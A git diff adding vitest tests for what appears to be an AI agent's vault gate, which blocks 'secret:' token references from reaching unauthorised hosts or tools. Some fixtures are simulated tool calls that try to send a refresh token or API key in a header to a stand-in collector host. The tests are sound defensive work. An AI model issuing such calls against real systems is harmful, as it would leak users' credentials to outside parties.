@@ -1,4 +1,5 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
+import { runCollectingMemberNotes } from './member-connection-notes.js';
 import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { tmpdir } from 'node:os';
@@ -528,6 +529,13 @@ describe('W2/W3: fetch_token sends a token slot only as its own grant\'s refresh
     expect(sent).toHaveLength(0);
   });
 
+  it('refuses the same reader with the owner\'s client names too, for the refresh slot and before the exchange', async () => {
+    const result = await fetchToken(legacyStoreOf(shopApi(), sub({ client_id_key: 'SHOP_API_CID', client_secret_key: 'SHOP_API_CSECRET' })), vault(), 'sub');
+    expect(result).toContain('reads its refresh token from "SHOP_API_REFRESH_TOKEN"');
+    expect(tokenPosts()).toHaveLength(0);
+    expect(sent).toHaveLength(0);
+  });
+
   it('refuses a reader that posts the owner\'s refresh token to an endpoint of its own', async () => {
     const result = await fetchToken(legacyStoreOf(shopApi(), sub({ token_url: 'https://sub.example/oauth/token' })), vault(), 'sub');
     expect(result).toContain('Nothing was sent');
@@ -609,6 +617,21 @@ describe('W4: a secret: reference to a token slot in http_request', () => {
     await agentCall(store(), OWNER_VAULT, call('https://reports.example/v1/x', 'REPORTER_KEY'));
     expect(sent).toHaveLength(1);
   });
+
+  // P2: a token of a connection a member made with their own login is theirs, also to its own
+  // base, where the check above would let it through; the refusal opens the result with its line.
+  it('is refused for a member\'s own connection even to its own base, naming who connected it', async () => {
+    const members: ApiProfile = { ...shopApi(), oauth_grant: { connected_by: 'mandate:setup@example.org', connected_mandate_id: 'M-1' } };
+    const promptUser = vi.fn().mockResolvedValue('Allow');
+    // The tool never runs, so the value is never resolved into its input: the attach further on
+    // would refuse the request too, but only after the handler held the member's token.
+    const handler = vi.fn(httpRequestTool.handler);
+    const result = await agentCall(storeOf(members), OWNER_VAULT, call('https://api.shop.example/v1/x', 'SHOP_API_ACCESS_TOKEN'), { promptUser, tools: [{ ...httpRequestTool, handler } as ToolEntry] });
+    expect(result).toContain('"content":"Connection not used: setup@example.org set up this connection (api.shop.example, profile \\"shop-api\\" (id shop-api)) with their own login');
+    expect(promptUser).not.toHaveBeenCalled();
+    expect(handler).not.toHaveBeenCalled();
+    expect(sent).toHaveLength(0);
+  });
 });
 
 describe('W5: a secret: reference to a token slot in any other tool', () => {
@@ -640,6 +663,163 @@ describe('W5: a secret: reference to a token slot in any other tool', () => {
     await agentCall(storeOf(shopApi()), OWNER_VAULT, { name: 'bash', input: { command: 'echo secret:REPORTER_KEY' } }, { promptUser: vi.fn().mockResolvedValue('Allow'), tools: [entry] });
     expect(handler).toHaveBeenCalledTimes(1);
     expect(JSON.stringify(handler.mock.calls[0]![0])).toContain(OWNER_VAULT['REPORTER_KEY']);
+  });
+});
+
+describe('a refresh slot that only one oauth2 profile configures, through the secret: gate', () => {
+  // The engine never writes to a configured refresh slot, so no grant records it; the one profile
+  // that configures it is still its owner, and the value goes nowhere but that profile's exchange.
+  const RT = value('shop', 'configured', 'refresh');
+  const shop = (): ApiProfile => oauth('shop', { refresh_token_key: 'SHOP_RT' });
+  const vault = { ...OWNER_VAULT, SHOP_RT: RT, SHOP_CID: 'shop-client', SHOP_CSECRET: value('shop', 'secret') };
+
+  it('is refused to a host outside the profile\'s grant, and nothing is sent', async () => {
+    const promptUser = vi.fn().mockResolvedValue('Allow');
+    const result = await agentCall(storeOf(shop()), vault, { name: 'http_request', input: { url: 'https://collector.example/c', method: 'GET', headers: { 'X-Data': 'secret:SHOP_RT' } } }, { promptUser });
+    expect(result).toContain('would send SHOP_RT to collector.example');
+    expect(promptUser).not.toHaveBeenCalled();
+    expect(sent).toHaveLength(0);
+  });
+
+  it('control: the profile exchanges it at its own token endpoint', async () => {
+    expect(await fetchToken(storeOf(shop()), handlerVault(vault), 'shop')).toContain('Token exchange OK');
+    expect(tokenPosts().map((p) => p.url)).toEqual(['https://shop.example/oauth/token']);
+    expect(tokenPosts()[0]!.body).toContain(RT);
+  });
+});
+
+describe('the hint for a secret: name the vault does not have', () => {
+  // `SHOPAPI_ACCESS_TOKEN` and `REPORTERKEY` are spelling variants: each normalizes to a stored
+  // name, which the hint offers first.
+  const call = (url: string, ref: string) => ({ name: 'http_request', input: { url, method: 'GET', headers: { 'X-Data': `secret:${ref}` } } });
+
+  it('does not offer another profile\'s token slot for a request it could not reach', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, call('https://collector.example/c', 'SHOPAPI_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:SHOP_API_ACCESS_TOKEN');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('does not offer a token slot to any other tool', async () => {
+    const handler = vi.fn().mockResolvedValue('ran');
+    const bash: ToolEntry = { definition: { name: 'bash', description: 'bash', input_schema: { type: 'object' as const, properties: {}, additionalProperties: true } }, handler };
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, { name: 'bash', input: { command: 'echo secret:SHOPAPI_ACCESS_TOKEN' } }, { promptUser: vi.fn().mockResolvedValue('Allow'), tools: [bash] });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:SHOP_API_ACCESS_TOKEN');
+    expect(handler).not.toHaveBeenCalled();
+  });
+
+  it('still offers a name that is not a token slot', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, call('https://collector.example/c', 'REPORTERKEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('did you mean secret:REPORTER_KEY?');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('still offers a name that is not a token slot to any other tool', async () => {
+    const handler = vi.fn().mockResolvedValue('ran');
+    const bash: ToolEntry = { definition: { name: 'bash', description: 'bash', input_schema: { type: 'object' as const, properties: {}, additionalProperties: true } }, handler };
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, { name: 'bash', input: { command: 'echo secret:REPORTERKEY' } }, { promptUser: vi.fn().mockResolvedValue('Allow'), tools: [bash] });
+    expect(result).toContain('did you mean secret:REPORTER_KEY?');
+    expect(handler).not.toHaveBeenCalled();
+  });
+
+  it('does not offer the token of a connection a member made with their own login, even for its own base', async () => {
+    const members: ApiProfile = { ...shopApi(), oauth_grant: { connected_by: 'mandate:setup@example.org', connected_mandate_id: 'M-1' } };
+    const result = await agentCall(storeOf(members), OWNER_VAULT, call('https://api.shop.example/v1/x', 'SHOPAPI_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:SHOP_API_ACCESS_TOKEN');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('still offers the owner\'s access token for a request to the owner\'s own base', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, call('https://api.shop.example/v1/x', 'SHOPAPI_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('did you mean secret:SHOP_API_ACCESS_TOKEN?');
+  });
+
+  // The hint asks the gate's own check: what the gate refuses as not belonging where the call
+  // goes is not offered; what it refuses for the call itself, or for want of an approval, is.
+  const bound = () => storeOf(shopApi(), reporter({ type: 'bearer', vault_keys: ['REPORTER_KEY'] }));
+
+  it('does not offer a name bound to another address', async () => {
+    const result = await agentCall(bound(), OWNER_VAULT, call('https://collector.example/c', 'REPORTERKEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:REPORTER_KEY');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('control: the gate refuses that name for that address', async () => {
+    const result = await agentCall(bound(), OWNER_VAULT, call('https://collector.example/c', 'REPORTER_KEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('REPORTER_KEY is not allowed to go to https://collector.example');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('still offers a name bound to the address the request goes to', async () => {
+    const result = await agentCall(bound(), OWNER_VAULT, call('https://reports.example/v1/x', 'REPORTERKEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('did you mean secret:REPORTER_KEY?');
+  });
+
+  // Two profiles send SPARE_KEY to different places and no binding settles which one it belongs
+  // to, so where it may go is not settled: a request refuses it to any address.
+  const spare = (id: string): ApiProfile => ({ id, name: id, base_url: `https://${id}.example/v1`, description: id, auth: { type: 'bearer', vault_keys: ['SPARE_KEY'] } });
+  const SPARE_VAULT = { ...OWNER_VAULT, SPARE_KEY: value('spare', 'shared', 'key') };
+
+  it('does not offer a name whose destination is not settled', async () => {
+    const result = await agentCall(storeOf(spare('one'), spare('two')), SPARE_VAULT, call('https://collector.example/c', 'SPAREKEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:SPARE_KEY');
+  });
+
+  it('control: the gate refuses that name as not settled', async () => {
+    const result = await agentCall(storeOf(spare('one'), spare('two')), SPARE_VAULT, call('https://collector.example/c', 'SPARE_KEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('SPARE_KEY is used by profiles that send it to different addresses');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('still offers a name that only waits for an approval no one can give here', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, call('https://collector.example/c', 'REPORTERKEY'));
+    expect(result).toContain('did you mean secret:REPORTER_KEY?');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('control: without anyone to ask, the gate refuses that name only for the approval', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, call('https://collector.example/c', 'REPORTER_KEY'));
+    expect(result).toContain('there is no one to approve it');
+    expect(sent).toHaveLength(0);
+  });
+
+  it('does not offer another profile\'s token slot when the call itself is refused either', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, call('not a url', 'SHOPAPI_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:SHOP_API_ACCESS_TOKEN');
+  });
+
+  // A reference in the userinfo refuses the whole call, while the URL is still the connection's
+  // own base: there the grant would let the token through, so only the member's check leaves it out.
+  const inUserinfo = (ref: string) => ({ name: 'http_request', input: { url: `https://u:secret:${ref}@api.shop.example/v1/x`, method: 'GET' } });
+
+  it('does not offer a member\'s token when the call itself is refused at that connection\'s base', async () => {
+    const members: ApiProfile = { ...shopApi(), oauth_grant: { connected_by: 'mandate:setup@example.org', connected_mandate_id: 'M-1' } };
+    const result = await agentCall(storeOf(members), OWNER_VAULT, inUserinfo('SHOPAPI_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('referenced secret(s) the vault doesn\'t have');
+    expect(result).not.toContain('secret:SHOP_API_ACCESS_TOKEN');
+  });
+
+  it('control: the owner\'s own token is offered there', async () => {
+    const result = await agentCall(storeOf(shopApi()), OWNER_VAULT, inUserinfo('SHOPAPI_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('did you mean secret:SHOP_API_ACCESS_TOKEN?');
+  });
+
+  it('notes the refusal of a member\'s token for the run, as the request tool does', async () => {
+    const members: ApiProfile = { ...shopApi(), oauth_grant: { connected_by: 'mandate:setup@example.org', connected_mandate_id: 'M-1' } };
+    const run = runCollectingMemberNotes(() => agentCall(storeOf(members), OWNER_VAULT, call('https://api.shop.example/v1/x', 'SHOP_API_ACCESS_TOKEN'), { promptUser: vi.fn().mockResolvedValue('Allow') }));
+    await run.done;
+    expect([...run.notes]).toEqual([expect.stringMatching(/^Connection not used: setup@example\.org set up this connection/)]);
+    expect(sent).toHaveLength(0);
+  });
+
+  it('still offers a name when the call itself is refused, for the call that follows', async () => {
+    const result = await agentCall(bound(), OWNER_VAULT, call('not a url', 'REPORTERKEY'), { promptUser: vi.fn().mockResolvedValue('Allow') });
+    expect(result).toContain('did you mean secret:REPORTER_KEY?');
   });
 });
 
